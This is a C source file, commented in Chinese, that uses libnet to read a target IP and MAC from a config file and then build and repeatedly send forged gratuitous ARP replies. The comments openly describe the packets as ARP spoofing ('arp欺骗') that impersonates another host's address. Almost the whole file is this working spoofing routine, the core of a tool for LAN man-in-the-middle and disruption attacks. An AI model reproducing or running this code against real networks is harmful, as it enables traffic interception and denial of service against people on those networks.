#include "mylib.h"

char *dev; // 网络接口名称（即网卡名）
unsigned char targetIP[4]; // 目标IP地址
unsigned char targetMAC[6]; // 目标MAC地址
unsigned char broadcastMAC[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}; // 以太网MAC广播地址
int speed; // 数据包发送速度
int times; // 一次发送多少个数据包

/* 将a_str按照a_delim分割成子串 */
char **str_split(char *a_str, const char a_delim) {
    char **result = 0;
    size_t count = 0;
    char *tmp = a_str;
    char *last_comma = 0;
    char delim[2];
    delim[0] = a_delim;
    delim[1] = 0;

    /* Count how many elements will be extracted. */
    while (*tmp) {
        if (a_delim == *tmp) {
            count++;
            last_comma = tmp;
        }
        tmp++;
    }

    /* Add space for trailing token. */
    count += last_comma < (a_str + strlen(a_str) - 1);

    /* Add space for terminating null string so caller
       knows where the list of returned strings ends. */
    count++;

    result = malloc(sizeof(char *) * count);

    if (result) {
        size_t idx = 0;
        char *token = strtok(a_str, delim);

        while (token) {
            assert(idx < count);
            *(result + idx++) = strdup(token);
            token = strtok(0, delim);
        }
        assert(idx == count - 1);
        *(result + idx) = 0;
    }

    return result;
}

/* 初始化参数，其中profile为配置文件的路径 */
void init(const char *profile, const char *appName) {
    dev = (char *) malloc(KEYVALLEN * sizeof(char));
    char IP[KEYVALLEN], MAC[KEYVALLEN], _speed[10], _times[10];
    getProfileString(profile, appName, "dev", dev);
    getProfileString(profile, appName, "ip", IP);
    getProfileString(profile, appName, "mac", MAC);
    getProfileString(profile, appName, "speed", _speed);
    getProfileString(profile, appName, "times", _times);

    char **ip = str_split(IP, '.');
    for (int i = 0; ip[i] != NULL; ++i) {
        targetIP[i] = (unsigned char) (atoi(ip[i]) & 0xff);
        free(ip[i]);
    }
    free(ip);

    char **mac = str_split(MAC, ':');
    for (int i = 0; mac[i] != NULL; ++i) {
        targetMAC[i] = (unsigned char) ((int) strtol(mac[i], NULL, 16) & 0xff);
        free(mac[i]);
    }
    free(mac);

    speed = atoi(_speed) < 0 ? 0 : atoi(_speed);
    times = atoi(_times) < 0 ? 10 : atoi(_times);
}

/* ARP 无偿应答包 */
int gratuitousArpReply(unsigned char *srcIP, unsigned char *srcMAC,
                       unsigned char *destIP, unsigned char *destMAC,
                       uint16_t arpOp, unsigned int sendTimes) {

    static char padPtr[18]; // 数据包中的负载内容
    libnet_t *net_t = NULL; // libnet_t* 是头文件libnet.h中用于网络通信中的非常重要的指针，称作句柄
    char err_buf[LIBNET_ERRBUF_SIZE]; //err_buf保存错误日志信息
    libnet_ptag_t p_tag; // ptag表示协议的标记

    net_t = libnet_init(LIBNET_LINK_ADV, dev, err_buf); // LIBNET_LINK_ADV表示链路层高级版本
    if (NULL == net_t) {
        printf("libnet_init error\n");//数据通信初始化失败
        printf("Error Log:\n%s\n", err_buf);
        return 2;
    }

    // 组建arp欺骗数据包
    p_tag = libnet_build_arp(
            ARPHRD_ETHER, // 硬件类型，根据arp的数据包组成可知，我们一般指定为以太网类型
            ETHERTYPE_IP, // 上层协议类型，根据arp的数据包组成可知，我们一般制定为ip协议
            MAC_ADDR_LEN,//硬件地址长度
            IP_ADDR_LEN, // 协议地址长度
            arpOp, //arp操作类型，比如arp请求，arp应答等（此处为arp应答）
            srcMAC, // 发送端以太网地址，这里填需要用于伪装的网卡MAC地址
            srcIP, // 发送端IP地址，这里需要伪装的IP
            destMAC, //目的以太网地址，这里填以太网广播地址，即ff:ff:ff:ff:ff:ff
            destIP, // 目的IP地址，这里与发送端的IP地址相同
            padPtr, //数据包中的负载内容
            18, //负载的数据长度
            net_t, //数据通信句柄
            0          //0代表第一次组建arp数据包
    );

    if (-1 == p_tag) {
        printf("libnet_build_arp error\n"); // 组建arp欺骗包失败
        printf("Error Log:\n%s\n", err_buf);
        libnet_destroy(net_t);
        return 3;
    }

    //创建以太网数据帧头部
    p_tag = libnet_build_ethernet(
            destMAC, // 目的物理地址
            srcMAC, // 源物理地址
            ETHERTYPE_ARP, //上层协议类型，即以太网arp协议
            padPtr, // 负载
            0, // 负载的长度
            net_t, // 数据通信句柄
            0 // 0代表第一次组建以太网数据帧头部
    );

    if (-1 == p_tag) {
        printf("libnet_build_ehternet error!\n");//创建以太网数据帧头部出错
        printf("Error Log:\n%s\n", err_buf);
        libnet_destroy(net_t);
        return 4;
    }

    for (int i = 0; i < sendTimes; ++i) {
        // libnet_write(net_t)代表发送已经构造好的数据包
        if (-1 == libnet_write(net_t)) {
            printf("libnet_write error!\n");
            printf("Error Log:\n%s\n", err_buf);
            libnet_destroy(net_t);
            return 5;
        }
    }

    libnet_destroy(net_t); // 数据包发送成功之后同样需要释放资源
    return 0; // 数据包发送成功
}



